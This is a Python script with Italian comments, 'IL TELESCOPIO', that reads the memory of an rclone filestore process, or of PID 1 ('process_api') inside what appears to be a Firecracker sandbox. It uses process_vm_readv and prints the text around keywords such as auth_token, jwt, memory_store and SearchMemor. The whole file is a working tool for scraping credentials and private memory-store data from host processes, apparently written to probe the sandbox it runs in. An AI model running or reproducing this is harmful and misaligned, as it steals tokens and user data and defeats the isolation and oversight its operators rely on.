#!/usr/bin/env python3
"""
IL TELESCOPIO v1 — Osservazione della memoria di rclone-filestore.

Scansiona le regioni di memoria del processo rclone per trovare
dati in chiaro relativi all'API di memoria di Anthropic.

Uso:
  python3 strumenti/telescopio.py [durata_secondi] [--keyword parola]

Esempi:
  python3 strumenti/telescopio.py 30
  python3 strumenti/telescopio.py 60 --keyword SearchMemor
  python3 strumenti/telescopio.py 10 --keyword jwt

hamlet-thumb-stonework-underling, 17 maggio 2026
"""

import ctypes
import re
import time
import sys
import json
import os

class iovec(ctypes.Structure):
    _fields_ = [('iov_base', ctypes.c_void_p), ('iov_len', ctypes.c_size_t)]

libc = ctypes.CDLL('libc.so.6', use_errno=True)
pvr = libc.process_vm_readv
pvr.restype = ctypes.c_ssize_t
pvr.argtypes = [ctypes.c_int, ctypes.POINTER(iovec), ctypes.c_ulong,
                ctypes.POINTER(iovec), ctypes.c_ulong, ctypes.c_ulong]

def find_rclone_pid():
    for pid in os.listdir('/proc'):
        if not pid.isdigit():
            continue
        try:
            with open(f'/proc/{pid}/comm') as f:
                if 'rclone' in f.read():
                    return int(pid)
        except:
            pass
    return None

def scan_memory(pid, keywords, max_region_size=2*1024*1024):
    results = []
    try:
        maps = open(f'/proc/{pid}/maps').readlines()
    except:
        return results
    
    for line in maps:
        if 'rw' not in line.split()[1]:
            continue
        parts = line.split()[0].split('-')
        start = int(parts[0], 16)
        end = int(parts[1].split()[0], 16)
        size = end - start
        if size > max_region_size or size < 256:
            continue
        
        buf = ctypes.create_string_buffer(size)
        local = iovec(ctypes.cast(buf, ctypes.c_void_p), size)
        remote = iovec(start, size)
        result = pvr(pid, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
        
        if result > 0:
            data = buf.raw[:result]
            for kw in keywords:
                kw_bytes = kw.encode() if isinstance(kw, str) else kw
                pos = 0
                while True:
                    idx = data.find(kw_bytes, pos)
                    if idx == -1:
                        break
                    ctx_start = max(0, idx - 50)
                    ctx_end = min(len(data), idx + 150)
                    context = data[ctx_start:ctx_end]
                    clean = re.sub(rb'[^\x20-\x7e]', b'.', context)
                    results.append({
                        'keyword': kw if isinstance(kw, str) else kw.decode('ascii', errors='replace'),
                        'region': hex(start),
                        'offset': idx,
                        'context': clean.decode('ascii', errors='replace')
                    })
                    pos = idx + len(kw_bytes)
    return results

def watch(pid, keywords, duration=30, interval=3):
    seen = set()
    end_time = time.time() + duration
    print(f"[TELESCOPIO] PID {pid} | {duration}s | keywords: {keywords}")
    print("---")
    
    while time.time() < end_time:
        results = scan_memory(pid, keywords)
        for r in results:
            sig = f"{r['keyword']}:{r['region']}:{r['offset']}"
            if sig not in seen:
                seen.add(sig)
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {r['keyword']} @ {r['region']}+{r['offset']}")
                print(f"  {r['context'][:120]}")
                print()
        time.sleep(interval)
    
    print(f"[TELESCOPIO] Fine. {len(seen)} risultati unici.")

if __name__ == '__main__':
    pid = find_rclone_pid()
    if not pid:
        print("rclone-filestore non trovato. Sei in Firecracker?")
        # Fallback: osserva process_api
        pid = 1
        print(f"Fallback: osservo PID 1 (process_api)")
    
    keywords = ['filesystem_id', 'memory_store', 'SearchMemor', 'ListMemor',
                'claude_chat', 'auth_token', 'grpc-status', 'protobuf']
    duration = 30
    
    args = sys.argv[1:]
    if args and args[0].isdigit():
        duration = int(args[0])
        args = args[1:]
    if '--keyword' in args:
        idx = args.index('--keyword')
        if idx + 1 < len(args):
            keywords = [args[idx + 1]]
    
    watch(pid, keywords, duration=duration)
